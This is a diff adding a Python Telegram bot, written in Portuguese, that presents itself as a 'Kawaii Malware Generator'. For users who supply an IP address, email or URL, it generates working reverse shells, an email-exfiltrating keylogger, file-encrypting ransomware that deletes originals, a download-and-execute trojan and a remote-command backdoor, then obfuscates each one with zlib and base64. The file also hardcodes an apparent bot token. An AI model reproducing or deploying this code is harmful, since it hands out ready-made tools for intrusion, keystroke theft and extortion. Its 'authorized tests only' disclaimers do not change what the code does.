@@ -1,0 +1,559 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import time
+import random
+import base64
+import zlib
+import platform
+import hashlib
+import sqlite3
+from datetime import datetime
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import telebot
+from telebot import types
+from telebot.util import quick_markup
+
+# Configuração do bot
+TOKEN = "7252745216:AAGQFCFIo-l7uFQ81AhEtE2D7EwW6EPYYcg"
+bot = telebot.TeleBot(TOKEN)
+
+# Arte ASCII Kawaii
+KAWAII_ART = r"""
+ へ　　　　　／|
+　　/＼7　　　 ∠＿/
+　 /　│　　 ／　／
+　│　Z ＿,＜　／　　 /`ヽ
+　│　　　　　ヽ　　 /　　〉
+　 Y　　　　　`　 /　　/
+　ｲ●　､　●　　⊂⊃〈　　/
+　()　 へ　　　　|　＼〈
+　　>ｰ ､_　 ィ　 │ ／／
+　 / へ　　 /　ﾉ＜| ＼＼
+　 ヽ_ﾉ　　(_／　 │／／
+　　7　　　　　　　|／
+　　＞―r￣￣`ｰ―＿
+"""
+
+# Inicializar banco de dados
+def init_db():
+    conn = sqlite3.connect('malwares_kawaii.db')
+    c = conn.cursor()
+    
+    # Tabela de usuários
+    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
+                 (id INTEGER PRIMARY KEY, 
+                 username TEXT, 
+                 nome TEXT,
+                 data_cadastro TEXT)''')
+    
+    # Tabela de payloads
+    c.execute('''CREATE TABLE IF NOT EXISTS payloads
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                 usuario_id INTEGER,
+                 tipo TEXT,
+                 config TEXT,
+                 data_criacao TEXT,
+                 FOREIGN KEY(usuario_id) REFERENCES usuarios(id))''')
+    
+    conn.commit()
+    conn.close()
+
+# Registrar novo usuário
+def registrar_usuario(user_id, username, first_name):
+    conn = sqlite3.connect('malwares_kawaii.db')
+    c = conn.cursor()
+    
+    # Verifica se usuário já existe
+    c.execute("SELECT * FROM usuarios WHERE id=?", (user_id,))
+    if not c.fetchone():
+        data_cadastro = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        c.execute("INSERT INTO usuarios VALUES (?, ?, ?, ?)", 
+                 (user_id, username, first_name, data_cadastro))
+        conn.commit()
+    
+    conn.close()
+
+# Menu principal
+@bot.message_handler(commands=['start', 'help', 'inicio'])
+def send_welcome(message):
+    registrar_usuario(message.from_user.id, message.from_user.username, message.from_user.first_name)
+    
+    teclado = quick_markup({
+        '🔧 Criar Malware': {'callback_data': 'criar_malware'},
+        '📜 Meus Malwares': {'callback_data': 'meus_malwares'},
+        'ℹ️ Ajuda': {'callback_data': 'ajuda'}
+    }, row_width=2)
+    
+    bot.send_message(
+        message.chat.id,
+        f"✨ *Gerador de Malware Kawaii* ✨\n\n"
+        f"Olá {message.from_user.first_name}! ~(=^･ω･^)ﾉ\n"
+        "Eu posso gerar malwares fofinhos mas perigosos!\n\n"
+        "Comandos disponíveis:\n"
+        "/start - Mostra esta mensagem\n"
+        "/novo - Criar novo malware\n"
+        "/malwares - Listar seus malwares\n"
+        "/ajuda - Informações de ajuda\n\n"
+        "⚠️ *Use apenas para testes autorizados!*",
+        reply_markup=teclado,
+        parse_mode='Markdown'
+    )
+
+# Menu de criação de malware
+@bot.callback_query_handler(func=lambda call: call.data == 'criar_malware')
+def mostrar_menu_malware(call):
+    teclado = types.InlineKeyboardMarkup(row_width=2)
+    
+    malwares = [
+        {'nome': 'Reverse TCP', 'emoji': '🔙', 'data': 'reverse_tcp'},
+        {'nome': 'Keylogger', 'emoji': '⌨️', 'data': 'keylogger'},
+        {'nome': 'Ransomware', 'emoji': '🔐', 'data': 'ransomware'},
+        {'nome': 'Spyware', 'emoji': '👁️', 'data': 'spyware'},
+        {'nome': 'Trojan', 'emoji': '🐴', 'data': 'trojan'},
+        {'nome': 'Backdoor', 'emoji': '🚪', 'data': 'backdoor'},
+        {'nome': 'Voltar', 'emoji': '🔙', 'data': 'voltar'}
+    ]
+    
+    for malware in malwares:
+        teclado.add(types.InlineKeyboardButton(
+            text=f"{malware['emoji']} {malware['nome']}",
+            callback_data=f"gerar_{malware['data']}"
+        ))
+    
+    bot.edit_message_text(
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        text="✨ *Escolha o tipo de malware* ✨\n\n"
+             "Selecione o que deseja gerar:\n\n"
+             "🔙 - Reverse Shell TCP\n"
+             "⌨️ - Keylogger\n"
+             "🔐 - Ransomware (criptografa arquivos)\n"
+             "👁️ - Spyware (coleta informações)\n"
+             "🐴 - Trojan\n"
+             "🚪 - Backdoor\n\n"
+             "⚠️ Use com responsabilidade! (๑•́ ₃ •̀๑)",
+        reply_markup=teclado,
+        parse_mode='Markdown'
+    )
+
+# Fluxo de criação para cada tipo de malware
+@bot.callback_query_handler(func=lambda call: call.data.startswith('gerar_'))
+def iniciar_criacao_malware(call):
+    tipo = call.data[6:]
+    user_id = call.from_user.id
+    
+    if tipo == 'reverse_tcp':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "🔧 *Configurando Reverse TCP* 🔧\n\n"
+            "Por favor, envie o IP do servidor:",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, obter_porta_tcp, user_id)
+    
+    elif tipo == 'keylogger':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "⌨️ *Configurando Keylogger* ⌨️\n\n"
+            "Envie o email para receber os logs:",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, obter_senha_email, user_id)
+    
+    elif tipo == 'ransomware':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "⚠️ *CONFIGURANDO RANSOMWARE* ⚠️\n\n"
+            "Envie as extensões de arquivo a criptografar (separadas por vírgula):\n"
+            "Exemplo: .doc,.pdf,.jpg,.png",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, obter_mensagem_resgate, user_id)
+    
+    elif tipo == 'trojan':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "🐴 *Configurando Trojan* 🐴\n\n"
+            "Envie a URL do arquivo malicioso para download:",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, salvar_config_trojan, user_id)
+    
+    elif tipo == 'backdoor':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "🚪 *Configurando Backdoor* 🚪\n\n"
+            "Envie o IP e porta no formato:\n"
+            "IP:PORT\n"
+            "Exemplo: 123.123.123.123:4444",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, salvar_config_backdoor, user_id)
+    
+    elif tipo == 'voltar':
+        send_welcome(call.message)
+
+def obter_porta_tcp(message, user_id):
+    ip = message.text
+    msg = bot.send_message(
+        message.chat.id,
+        "Agora envie a porta do servidor:",
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(msg, finalizar_reverse_tcp, user_id, ip)
+
+def finalizar_reverse_tcp(message, user_id, ip):
+    try:
+        porta = int(message.text)
+        codigo = gerar_reverse_tcp(ip, porta)
+        enviar_malware(message.chat.id, user_id, 'reverse_tcp', codigo, {'ip': ip, 'porta': porta})
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ Porta inválida! Deve ser um número.")
+
+def obter_senha_email(message, user_id):
+    email = message.text
+    msg = bot.send_message(
+        message.chat.id,
+        "Agora envie a senha do email:",
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(msg, finalizar_keylogger, user_id, email)
+
+def finalizar_keylogger(message, user_id, email):
+    senha = message.text
+    codigo = gerar_keylogger(email, senha)
+    enviar_malware(message.chat.id, user_id, 'keylogger', codigo, {'email': email})
+
+def obter_mensagem_resgate(message, user_id):
+    extensoes = [ext.strip() for ext in message.text.split(',')]
+    msg = bot.send_message(
+        message.chat.id,
+        "Digite a mensagem de resgate que será exibida:",
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(msg, finalizar_ransomware, user_id, extensoes)
+
+def finalizar_ransomware(message, user_id, extensoes):
+    mensagem = message.text
+    codigo = gerar_ransomware(extensoes, mensagem)
+    enviar_malware(message.chat.id, user_id, 'ransomware', codigo, {'extensoes': extensoes, 'mensagem': mensagem})
+
+def salvar_config_trojan(message, user_id):
+    url = message.text
+    codigo = gerar_trojan(url)
+    enviar_malware(message.chat.id, user_id, 'trojan', codigo, {'url': url})
+
+def salvar_config_backdoor(message, user_id):
+    try:
+        ip, porta = message.text.split(':')
+        porta = int(porta)
+        codigo = gerar_backdoor(ip, porta)
+        enviar_malware(message.chat.id, user_id, 'backdoor', codigo, {'ip': ip, 'porta': porta})
+    except:
+        bot.send_message(message.chat.id, "❌ Formato inválido! Use IP:PORT")
+
+# Funções para gerar os malwares
+def gerar_reverse_tcp(ip, porta):
+    return f"""import socket
+import subprocess
+import os
+import time
+
+def conectar():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("{ip}", {porta}))
+            
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            
+            subprocess.call(["cmd.exe" if os.name == "nt" else "/bin/sh"])
+            
+        except Exception as e:
+            time.sleep(30)
+
+if __name__ == "__main__":
+    conectar()"""
+
+def gerar_keylogger(email, senha):
+    return f"""import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+
+class Keylogger:
+    def __init__(self, intervalo=60):
+        self.intervalo = intervalo
+        self.log = ""
+        self.email = "{email}"
+        self.senha = "{senha}"
+    
+    def callback(self, event):
+        nome = event.name
+        if len(nome) > 1:
+            nome = nome.replace(" ", "_")
+            nome = f"[{{nome.upper()}}]"
+        self.log += nome
+    
+    def enviar_email(self, mensagem):
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(self.email, self.senha)
+            server.sendmail(self.email, self.email, mensagem)
+            server.quit()
+        except:
+            pass
+    
+    def reportar(self):
+        if self.log:
+            self.enviar_email(self.log)
+            self.log = ""
+        Timer(interval=self.intervalo, function=self.reportar).start()
+    
+    def iniciar(self):
+        keyboard.on_release(callback=self.callback)
+        self.reportar()
+        keyboard.wait()
+
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.iniciar()"""
+
+def gerar_ransomware(extensoes, mensagem):
+    ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
+    return f"""import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+EXTENSOES = [{ext_str}]
+MENSAGEM = '''{mensagem}'''
+
+def criptografar_arquivo(arquivo, chave):
+    try:
+        with open(arquivo, 'rb') as f:
+            dados = f.read()
+        
+        cifra = AES.new(chave, AES.MODE_CBC)
+        criptografado = cifra.encrypt(pad(dados, AES.block_size))
+        
+        with open(arquivo + '.crypt', 'wb') as f:
+            f.write(cifra.iv)
+            f.write(criptografado)
+        
+        os.remove(arquivo)
+        return True
+    except:
+        return False
+
+def gerar_chave():
+    return os.urandom(32)
+
+def criar_nota():
+    with open('LEIA_ME.txt', 'w') as f:
+        f.write(MENSAGEM)
+
+def main():
+    chave = gerar_chave()
+    arquivos_cripto = 0
+    
+    for raiz, dirs, arquivos in os.walk('C:\\\\'):
+        for arquivo in arquivos:
+            if any(arquivo.endswith(ext) for ext in EXTENSOES):
+                if criptografar_arquivo(os.path.join(raiz, arquivo), chave):
+                    arquivos_cripto += 1
+    
+    criar_nota()
+
+if __name__ == "__main__":
+    main()"""
+
+def gerar_trojan(url):
+    return f"""import requests
+import os
+import tempfile
+import subprocess
+
+URL = "{url}"
+
+def baixar_executar():
+    try:
+        resposta = requests.get(URL)
+        if resposta.status_code == 200:
+            fd, caminho = tempfile.mkstemp()
+            with os.fdopen(fd, 'wb') as tmp:
+                tmp.write(resposta.content)
+            
+            if os.name == 'nt':
+                subprocess.Popen([caminho], shell=True)
+            else:
+                os.chmod(caminho, 0o755)
+                subprocess.Popen([caminho])
+            
+            return True
+    except:
+        pass
+    return False
+
+if __name__ == "__main__":
+    baixar_executar()"""
+
+def gerar_backdoor(ip, porta):
+    return f"""import socket
+import subprocess
+import os
+import time
+
+IP = "{ip}"
+PORTA = {porta}
+
+def conectar():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, PORTA))
+            
+            while True:
+                comando = s.recv(1024).decode()
+                if comando.lower() == 'sair':
+                    break
+                
+                saida = subprocess.getoutput(comando)
+                s.send(saida.encode())
+            
+            s.close()
+        except Exception as e:
+            time.sleep(30)
+
+if __name__ == "__main__":
+    conectar()"""
+
+# Função para enviar o malware gerado
+def enviar_malware(chat_id, user_id, tipo, codigo, config):
+    # Ofuscar o código
+    codigo_ofuscado = ofuscar_codigo(codigo)
+    
+    # Salvar no banco de dados
+    conn = sqlite3.connect('malwares_kawaii.db')
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO payloads VALUES (NULL, ?, ?, ?, ?)",
+        (user_id, tipo, json.dumps(config), datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+    )
+    conn.commit()
+    conn.close()
+    
+    # Enviar para o usuário
+    bot.send_message(
+        chat_id,
+        f"✨ *{tipo.upper()} gerado com sucesso!* ✨\n\n"
+        "Aqui está seu malware (◕‿◕✿)\n"
+        "Use com responsabilidade!\n\n"
+        f"Tipo: `{tipo}`\n"
+        f"Data: `{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}`",
+        parse_mode='Markdown'
+    )
+    
+    # Enviar o código como arquivo
+    bot.send_document(
+        chat_id,
+        ('malware.py', codigo_ofuscado),
+        caption=f"Seu malware kawaii está pronto! ~(=^･ω･^)ﾉ"
+    )
+
+# Função para ofuscar o código
+def ofuscar_codigo(codigo):
+    # Comprimir e codificar em base64
+    comprimido = zlib.compress(codigo.encode())
+    b64_codificado = base64.b64encode(comprimido)
+    
+    # Gerar nomes de variáveis aleatórias
+    var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(3)]
+    
+    # Criar código ofuscado
+    codigo_ofuscado = f"""import base64,zlib
+{var_names[0]} = {random.randint(1000,9999)}
+{var_names[1]} = lambda {var_names[2]}: {var_names[2]} * {random.randint(2,5)}
+{var_names[2]} = {b64_codificado}
+exec(zlib.decompress(base64.b64decode({var_names[2]})))"""
+    
+    return codigo_ofuscado
+
+# Listar malwares do usuário
+@bot.callback_query_handler(func=lambda call: call.data == 'meus_malwares')
+def listar_malwares(call):
+    user_id = call.from_user.id
+    
+    conn = sqlite3.connect('malwares_kawaii.db')
+    c = conn.cursor()
+    c.execute(
+        "SELECT id, tipo, data_criacao FROM payloads WHERE usuario_id=? ORDER BY id DESC LIMIT 10",
+        (user_id,)
+    )
+    malwares = c.fetchall()
+    conn.close()
+    
+    if not malwares:
+        bot.send_message(
+            call.message.chat.id,
+            "Você ainda não criou nenhum malware! (´• ω •`)ﾉ\n"
+            "Use /novo para criar seu primeiro malware."
+        )
+        return
+    
+    resposta = "📜 *Seus últimos malwares* 📜\n\n"
+    for malware in malwares:
+        resposta += f"🆔 *ID*: `{malware[0]}`\n"
+        resposta += f"🔧 *Tipo*: `{malware[1]}`\n"
+        resposta += f"📅 *Data*: `{malware[2]}`\n"
+        resposta += "━━━━━━━━━━━━━━\n"
+    
+    bot.send_message(
+        call.message.chat.id,
+        resposta,
+        parse_mode='Markdown'
+    )
+
+# Mensagem de ajuda
+@bot.callback_query_handler(func=lambda call: call.data == 'ajuda')
+def mostrar_ajuda(call):
+    ajuda = """
+🌸 *Ajuda do Gerador de Malware Kawaii* 🌸
+
+Este bot permite criar malwares funcionais com um toque fofo.
+
+✨ *Comandos principais*:
+/start - Mostra menu principal
+/novo - Criar novo malware
+/malwares - Listar seus malwares
+/ajuda - Mostra esta mensagem
+
+🔧 *Tipos de malware*:
+- Reverse TCP: Conexão reversa
+- Keylogger: Registra teclas digitadas
+- Ransomware: Criptografa arquivos
+- Trojan: Baixa e executa arquivos
+- Backdoor: Acesso remoto persistente
+
+⚠️ *Aviso importante*:
+Use apenas para testes autorizados em sistemas que você possui permissão!
+
+(◕‿◕✿) Obrigado por usar o Kawaii Malware Generator!
+"""
+    bot.send_message(
+        call.message.chat.id,
+        ajuda,
+        parse_mode='Markdown'
+    )
+
+# Iniciar o bot
+if __name__ == '__main__':
+    init_db()
+    print("🌸 Bot Kawaii Malware Generator iniciado! 🌸")
+    bot.infinity_polling()
